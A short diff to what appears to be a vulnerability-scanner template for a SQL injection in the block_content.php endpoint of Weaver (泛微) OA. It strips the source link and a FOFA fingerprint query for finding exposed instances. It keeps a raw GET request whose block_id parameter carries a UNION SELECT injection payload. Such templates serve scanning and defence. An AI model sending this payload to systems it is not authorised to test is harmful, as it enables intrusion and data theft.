@@ -3,12 +3,8 @@ info:
   name: 泛微OA block_content.php 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gh2tz5hg137wr38g'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gh2tz5hg137wr38g
-    fofa: body = "/wui/common/css/w7OVFont_wev8.css" || header="testBanCookie" || body="/wui/common/css/w7OVFont.css" || body="/js/ecology8" || body="alert('高效源于协同')" || body="wui/common/css/w7OVFont_wev8.css"|
 http:
 - raw:
   - GET /general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5(123456)%20AS%20NCHAR),0x20),0x7171627671)--%20- HTTP/1.1
